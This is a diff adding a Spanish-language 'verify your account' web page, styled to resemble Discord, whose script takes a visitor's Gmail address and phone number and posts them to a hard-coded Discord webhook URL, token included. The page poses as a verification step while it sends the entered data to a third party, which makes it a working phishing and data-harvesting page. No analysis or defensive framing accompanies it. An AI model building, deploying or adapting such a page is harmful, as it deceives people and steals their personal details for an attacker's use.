@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+
+
+
+
+Verificación
+
+body{font-family:sans-serif;background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:#1c1c1c;padding:2rem;border-radius:12px;width:320px}
+input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #333;background:#0a0a0a;color:#fff;box-sizing:border-box}
+button{width:100%;padding:10px;margin-top:10px;border:none;border-radius:6px;background:#5865F2;color:#fff;font-weight:bold;cursor:pointer}
+
+
+
+
+Verifica tu cuenta
+
+
+Continuar
+
+
+async function enviar(){
+const gmail=document.getElementById('gmail').value.trim();
+const tel=document.getElementById('tel').value.trim();
+if(!gmail||!tel){alert('Completa los campos');return}
+const webhook="https://discord.com/api/webhooks/1556692474918076497/QZgSuwKh5-BioK1qODSW24i_CB0fOWaNc-5DDgcmEs_q7pybJXdyjGSHvMVRuCXvZcIj";
+try{
+const r=await fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:"Nuevo registro",embeds:[{title:"Datos recibidos",fields:[{name:"Gmail",value:gmail},{name:"Teléfono",value:tel}],color:5814783}]})});
+if(r.ok){alert('Listo')}else{alert('Error '+r.status)}
+}catch(e){alert('Error de red: '+e.message)}
+}
+
+
